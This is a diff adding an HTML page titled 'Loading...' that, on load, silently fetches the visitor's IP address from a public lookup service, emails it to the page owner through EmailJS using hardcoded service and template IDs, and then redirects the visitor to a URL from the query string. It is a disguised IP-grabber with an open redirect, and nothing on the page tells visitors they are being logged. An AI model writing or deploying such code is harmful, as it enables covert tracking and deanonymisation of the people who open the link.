@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <!-- Include EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init({publicKey: "RmFfdVvDpWrRq7RaQ"});
+        })();
+        function getRedirectUrl() {
+            // Set a default URL if none provided
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('redirect') || 'https://google.com';
+        }
+    </script>
+</head>
+<body>
+    <script>
+        // Function to send the IP address via EmailJS
+        function sendIpByEmail(ip) {
+            emailjs.send("service_2hgg9ff", "template_6l8rwyd", {user_ip: ip})
+            .then(response => {
+                // Redirect after successful email
+                window.location.href = getRedirectUrl();
+            })
+            .catch(error => console.error("Error sending IP:", error));
+        }
+
+        // Fetch the user's IP address using a public API
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                // Send IP via email using EmailJS
+                sendIpByEmail(data.ip);
+            })
+            .catch(error => console.error('Error fetching IP:', error));
+    </script>
+</body>
+</html>
